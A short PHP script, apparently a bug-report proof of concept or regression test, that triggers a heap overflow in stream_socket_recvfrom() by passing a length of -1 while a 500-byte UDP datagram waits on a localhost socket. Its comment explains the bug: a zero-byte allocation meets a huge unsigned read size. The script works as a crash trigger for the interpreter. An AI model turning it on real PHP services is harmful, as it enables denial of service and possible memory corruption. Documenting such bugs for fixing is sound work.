<?php
/* stream_socket_recvfrom() with a negative length. to_read=-1 makes
   emalloc(to_read+1) allocate a 0-byte buffer while the negative length is
   passed on to the recv path as a huge size_t, so incoming datagram bytes are
   written past the tiny allocation -> heap overflow. */
$srv = stream_socket_server("udp://127.0.0.1:0", $errno, $errstr, STREAM_SERVER_BIND);
$name = stream_socket_get_name($srv, false);
$cli = stream_socket_client("udp://$name", $errno, $errstr);
fwrite($cli, str_repeat("A", 500));
usleep(50000);
$data = stream_socket_recvfrom($srv, -1, 0, $peer);
var_dump($data);
